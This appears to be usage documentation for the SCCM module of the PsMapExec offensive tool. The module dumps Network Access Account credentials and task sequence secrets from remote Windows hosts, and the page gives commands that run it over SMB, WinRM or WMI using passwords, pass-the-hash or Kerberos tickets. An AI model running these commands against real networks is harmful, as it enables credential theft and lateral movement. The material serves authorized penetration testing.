# SCCM

Dumps local SCCM secrets for Network Access Account credentials and Task sequence data. Collected information is automatically parsed and organized where it will be stored in $PWD\PME\SCCM\.

# Usage

##### SMB execution with password authentication, targeting workstations

    PsMapExec SMB -Targets "Workstations" -Username [User] -Password [Pass] -Module SCCM

##### WinRM execution with hash authentication, targeting servers

    PsMapExec WinRM -Targets "Servers" -Username [User] -Hash [Hash] -Module SCCM

##### WMI execution with Kerberos ticket authentication (Username not required)

    PsMapExec WMI -Targets "All" -Ticket [doI..] -Module SCCM

# Optional Parameters

### 1) Will ommit parsing output from each system.

    -NoParse

### 2) Displays each targets output to the console

    -ShowOutput

### 3) Display only successful results

    -SuccessOnly

# Supported Methods

1) SMB 

2) SessionHunter

3) WMI 

4) WinRM
